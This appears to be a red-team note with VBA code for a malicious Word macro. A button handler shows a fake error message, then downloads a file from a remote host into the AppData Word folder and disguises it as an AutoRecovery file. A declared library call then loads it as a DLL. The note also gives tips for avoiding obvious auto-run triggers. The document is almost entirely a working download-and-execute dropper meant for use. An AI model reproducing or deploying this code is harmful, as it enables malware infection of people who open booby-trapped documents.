Reference : "https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/"
Reference : "https://codingislove.com/http-requests-excel-vba/" ( Proxy Aware )

Not to use AutoOpen and Auto_Open cause it is an obvious sign of hey please run my macro
You can change the label of the button by using designer mode > CommandButton Object > Edit
```
Public Sub CommandButton1_Click()

MsgBox "An error has occured"
Module1.General

End Sub
```

```
Sub General()
    Dim pathOfFile As String
    pathOfFile = Environ("AppData") & "\Microsoft\Word"
    VBA.ChDir pathOfFile
    ' DLL get loaded in module2
    
    Dim remoteFile As String
    Dim storeIn As String
    Dim HTTPReq As Object
    
    'Getting the remote file
    
    remoteFile = "https://example.com/client.js"
    storeIn = "AutoRecovery save of Document4.asd"
    
    ' Request the file and rertrieve it
    
    Set HTTPReq = CreateObject("Microsoft.XMLHTTP")
    HTTPReq.Open "GET", remoteFile, False
    HTTPReq.send
    
    If HTTPReq.Status = 200 Then
        Set output = CreateObject("ADODB.Stream")
        output.Open
        output.Type = 1 ' 1 = binary data
        output.Write HTTPReq.responseBody
        ' 2 = create, but if exists overwrite
        output.SaveToFile storeIn, 2
        output.Close
        
        Module2.Invoke ' Call the subroutine in module 2
        
    End If
        
End Sub

```
Need to save it as module 2.

```
Private Declare Sub Run Lib "AutoRecovery save of Document4.asd" ()

Sub Invoke()
    Run ' Execute the dll
End Sub
```
